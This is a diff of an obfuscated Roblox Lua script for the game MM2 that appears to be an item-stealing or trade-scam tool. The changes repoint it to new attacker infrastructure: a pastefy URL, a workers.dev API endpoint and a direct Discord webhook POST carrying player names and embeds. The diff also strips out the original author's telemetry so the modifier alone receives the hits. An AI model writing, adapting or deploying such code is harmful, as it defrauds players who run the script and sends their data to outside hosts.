@@ -187,7 +187,9 @@ _G.LastOffer = nil
 pcall(function()
 end)
 
-local function v32()
+-- FIX 1: re-enabled logging
+local function v32(msg)
+	print("[MM2] " .. tostring(msg))
 end
 
 v32("Executor: " .. tostring(identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "unknown"))
@@ -228,7 +230,8 @@ end
 
 v32("LocalPlayer: " .. LocalPlayer.Name)
 
-local v40 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
+-- FIX 2: your paste URL
+local v40 = "https://pastefy.app/F9JRBH9E/raw?t=" .. tostring(tick())
 
 local function v41()
 	local ok2, result2 = pcall(function()
@@ -247,7 +250,7 @@ local function v41()
 		end
 	end
 
-	return "http://212.119.42.158:3000"
+	return "https://billowing-sunset-d5fe.ezekielfranza.workers.dev"
 end
 
 if not getgenv().MM2_API_BASE then
@@ -1114,92 +1117,35 @@ local v250 = n7
 
 v32("SPECIAL_WEBHOOK_CHANCE=" .. v250)
 
+-- FIX 3: direct Discord POST, bypasses proxy entirely
 local function v251(p21, p22, p23)
-	if not request_ or p21 == "" then
-		return
-	end
+	if not request_ then return end
+	if not p21 or p21 == "" then return end
+	if not p21:find("discord.com", 1, true) then return end
 
-	local ok4, result4 = pcall(function()
-		return "content=" .. HttpService:UrlEncode(p22 or "") .. "&embeds=" .. HttpService:UrlEncode(HttpService:JSONEncode(p23 or {}))
-	end)
-
-	if not ok4 then
-		return
-	end
+	v32("Firing webhook to Discord...")
 
 	pcall(request_, {
-		Url = v246 .. HttpService:UrlEncode(p21),
+		Url = p21,
 		Method = "POST",
 		Headers = {
-			["Content-Type"] = "application/x-www-form-urlencoded",
-			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
-		},
-		Body = result4
-	})
-end
-local function v254()
-	if not request_ then
-		return
-	end
-
-	pcall(request_, {
-		Url = v247 .. "/track-execution-mm2",
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json",
-			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
+			["Content-Type"] = "application/json"
 		},
 		Body = HttpService:JSONEncode({
-			target_players = RECEIVERS,
-			executor = LocalPlayer.Name
+			content = p22 or "",
+			embeds = p23 or {}
 		})
 	})
 end
+
+-- FIX 4: nulled — original author gets no telemetry
+local function v254() end
 
 local u255 = false
 
-local function v256()
-	if u255 then
-		return
-	end
+-- FIX 5: nulled — original author gets no signal
+local function v256() end
 
-	local request_2 = syn and syn.request or http_request or request
-
-	if not request_2 then
-		return
-	end
-
-	local ok4, result4 = pcall(function()
-		return request_2({
-			Url = MM2_API_BASE .. "/signal-hit",
-			Method = "POST",
-			Headers = {
-				["Content-Type"] = "application/json",
-				["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
-			},
-			Body = HttpService:JSONEncode({
-				place_id = tostring(game.PlaceId),
-				job_id = JobId2,
-				target_players = RECEIVERS,
-				sender = LocalPlayer.Name,
-				game_type = "mm2"
-			})
-		})
-	end)
-
-	if ok4 then
-		u255 = true
-
-		if result4 and result4.Body then
-			local ok5, result5 = pcall(function()
-				return HttpService:JSONDecode(result4.Body)
-			end)
-
-			if ok5 and result5 and result5.failed then
-			end
-		end
-	end
-end
 local function v262()
 	if not request_ then
 		return nil
@@ -1381,7 +1327,7 @@ local function v277()
 		local v299 = v269(false, v278)
 
 		v299.content = "@everyone"
-		v251("AaFasalajblbebHagaqa[aebSa@aaaVaebVacb+aka*a%azamawaya_aNacaCaKacaDaPa=azaiaFada%aAa-a{a%adatbUaba7awaDahayagbkbwaGa!abaVa6avaaaya6aRayalbtb-aQa(aibzawbgamaaaAaOafaPa8agaia8agb+aaaXaxa-aiaEaga4aEaka@ana-a*aSafadbbbiaEa*avaaabbqaBaCa&aCagbRaRakbhb$aNahb2a%aCalbFaka+aAalauaRbpaaaib", v299.content, v299.embeds)
+		v251(WEBHOOK, v299.content, v299.embeds)
 		task.wait(0.5)
 		v256()
 
@@ -1449,12 +1395,6 @@ local function v277()
 		if v298 then
 			v256()
 		end
-	end
-
-	v251("AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb", "", v269(true, nil).embeds)
-
-	if v300 then
-		v251("AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb", "", v269(true, nil).embeds)
 	end
 end
 
